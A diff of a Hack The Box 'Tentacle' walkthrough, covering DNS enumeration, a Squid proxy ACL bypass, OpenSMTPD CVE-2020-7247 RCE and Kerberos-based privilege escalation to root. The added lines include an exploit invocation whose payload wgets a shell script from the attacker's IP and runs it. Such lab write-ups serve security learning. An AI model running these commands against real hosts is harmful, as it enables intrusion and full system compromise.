@@ -61,13 +61,11 @@ ns.realcorp.htb.	259200	IN	A	10.197.243.77
 ;; MSG SIZE  rcvd: 143
 ```
 
-*Basically, NS records tell the Internet where to go to find out a domain's IP address.*
-
-Found nameserver with internal ip address.
+* Found internal host IP `10.197.243.77` which is running nameserver.
 
 __dnsenum__
 
-Bruteforce subdomains from dns server.
+Bruteforce hosts from dns server.
 ```bash
 ❯ dnsenum --threads 64 --dnsserver 10.10.10.224 -f /usr/share/seclists/Discovery/DNS/namelist.txt realcorp.htb
 -----   realcorp.htb   -----
@@ -93,11 +91,11 @@ wpad.realcorp.htb.                       259200   IN    A        10.197.243.31
 done.
 ```
 
-found 1 subdomain on `10.197.243.31` __wpad.realcorp.htb__
+* Host on `10.197.243.77` also running proxy server.
+* and there is another host running wpad(?)
+  * __[wpad](https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol)__(Web Proxy Auto-Discovery Protocol) is a method used by clients to locate the URL of a configuration file using DHCP and/or DNS discovery methods. 
 
-__dnsrecon__
-
-There is another way to reverse dns bruteforce with `dnsrecon`, after founding internal ip address. 
+There is another way to reverse dns bruteforce with `dnsrecon`, on entire subnet. 
 ```bash
 ❯ dnsrecon -r 10.197.243.0/24 -n 10.10.10.224 -d realcorp.htb
 [*] Reverse Look-up of a Range
@@ -107,18 +105,26 @@ There is another way to reverse dns bruteforce with `dnsrecon`, after founding i
 [+] 2 Records Found
 ```
 
-this subdomain holds by nameserver on `10.197.243.77`
-
 ## squid proxy
 
 There is a http-porxy running. which also leaking some information.
 
 ![](screenshots/subdomain-leak.png)
 
-* subdomain: `srv01.realcorp.htb`
-* email: `j.nakazawa@realcorp.htb`
+* Subdomain: `srv01.realcorp.htb`
+* Email: `j.nakazawa@realcorp.htb`
+* Username: `j.nakazawa`
 
-another thing is that, This can allow us to access internal nameserver to resolve `wpad.realcorp.htb`
+Because [zone transfer](https://en.wikipedia.org/wiki/DNS_zone_transfer) in not available
+```bash
+❯ dig axfr realcorp.htb @10.10.10.224
+
+; <<>> DiG 9.16.15-Debian <<>> axfr realcorp.htb @10.10.10.224
+;; global options: +cmd
+; Transfer failed.
+```
+
+we can use this proxy to access internal proxy.
 
 Setup `proxychains` to send traffic through the squid proxy
 and `/etc/proxychains.conf`
@@ -128,9 +134,12 @@ and `/etc/proxychains.conf`
 # add proxy here ...
 #tentacle
 http	10.10.10.224	3128    #Go through the squid proxy
-http	127.0.0.1   3128        #access to internal host
-http    10.197.243.77   3128    #and resolve internal nameserver
+http	127.0.0.1   3128        #go through localhost to bypass ACL
+http    10.197.243.77   3128    #connect to internal proxy
 ```
+
+* Access control list (ACL) files are text files containing lists that define who can access Proxy Server resources. By default, the Proxy Server uses one ACL file that contains all of the lists for access to your server.
+* In this case proxy server restrict external IP to access internal host but localhost allowed.
 
 and now we can access to internal host `10.197.243.31`
 ```bash
@@ -154,7 +163,7 @@ port 80 on internal host is running nginx. *Run `proxychains firefox` command to
 
 ![](screenshots/internal-http.png)
 
-Subdomain `wpad.realcorp.htb` giving 403
+host `wpad.realcorp.htb` giving 403 on port 80.
 
 ![](screenshots/internal-subdomain.png)
 
@@ -237,7 +246,7 @@ function FindProxyForURL(url, host) {
 }
 ```
 
-and get another internal host subnet `10.241.251.0/24`
+and get another internal subnet `10.241.251.0/24`
 
 Running `dnsrecon` for reverse dns bruteforce.
 ```bash
@@ -248,7 +257,7 @@ Running `dnsrecon` for reverse dns bruteforce.
 [+] 1 Records Found
 ```
 
-Found another host on `10.241.251.113`.
+* Found another host on `10.241.251.113`.
 
 Running nmap scan found port 25 smtp
 ```bash
@@ -281,11 +290,14 @@ Shellcodes: No Results
 
 __[CVE-2020-7247](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247):__ smtp_mailaddr in smtp_session.c in OpenSMTPD 6.6, as used in OpenBSD 6.6 and other products, allows remote attackers to execute arbitrary commands as root via a crafted SMTP session, as demonstrated by shell metacharacters in a MAIL FROM field. This affects the "uncommented" default configuration. The issue exists because of an incorrect return value upon failure of input validation. __[Exploit](https://www.exploit-db.com/exploits/47984)__
 
-only change requires in exploit script is `RCPT <email>` which we found from squid leak `j.nakazawa@realcorp.htb`
+only change requires in exploit script is `RCPT <email>`(a valid user email) which we found from squid leak `j.nakazawa@realcorp.htb`
 
 ![](screenshots/opensmtp-rce.png)
 
-Fetting reverse shell with python web server and wget.
+Getting reverse shell with python web server and wget.
+```bash
+proxychains python smtp-rce.py 10.241.251.113 25 'wget -q -O ss.sh 10.10.15.71/shell.sh;bash ss.sh'
+```
 
 ![](screenshots/reverse-shell.png)
 
@@ -345,6 +357,8 @@ sJB}RM>6Z~64_
 
 ![](screenshots/token-to-ssh.png)
 
+__Update:__ `GSSAPIAuthentication` already enables by default from ssh config file so `-o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes` are not required, the real reason for this to not work because GSSAPI cheaking for user in `REALCORP.HTB`'s krb database but user is in `srv01.realcorp.htb` and if we add `srv01.realcorp.htb` in `hosts` file and login with this host, it still won't work because GSSAPI takes first host name from `/etc/hosts` file, for this problem we can use `GSSAPIServerIdentity` to specify host which to look for.
+
 ## Crontab to k5login
 
 Found crontab running `/usr/local/bin/log_backup.sh` as user "admin" on `srv01` host
@@ -364,7 +378,7 @@ cd /home/admin
 
 script is syncing `/var/log/squid/` to `/home/admin/`, that means all file from `/var/log/squid/` direcotry copy to `/home/admin/` and than creates tar archive from these file.
 
-I Found a login technique with kerberos with `.k5login` config file from [kerberos docs](https://web.mit.edu/kerberos/krb5-devel/doc/user/user_config/k5login.html)
+Found a login technique with kerberos with `.k5login` config file from [kerberos docs](https://web.mit.edu/kerberos/krb5-devel/doc/user/user_config/k5login.html)
 
 __EXAMPLES__
 
@@ -386,9 +400,7 @@ __Create `.k5login` file in the `/var/log/squid/` folder.__
 echo 'j.nakazawa@REALCORP.HTB' > /var/log/squid/.k5login
 ```
 
-__and wait__
-
-ssh to "admin" with user "j.nakazawa" token 
+and ssh to "admin" with user "j.nakazawa" token 
 
 ![](screenshots/k5admin.png)
 
@@ -441,7 +453,7 @@ KVNO Principal
   --- Impersonation command: kadmin -k -t /etc/krb5.keytab -p "kadmin/admin@REALCORP.HTB"
 ```
 
-we can use keytab principal to authenticate into Kerberos V5 administration system console. 
+we can use keytab admin principal to authenticate into Kerberos V5 administration system console. 
 ```bash
 kadmin -k -t /etc/krb5.keytab -p "kadmin/admin@REALCORP.HTB"
 # -t keytab file
@@ -470,4 +482,3 @@ ksu root
 ```
 
 ![](screenshots/tentacle-rooted.png)
-
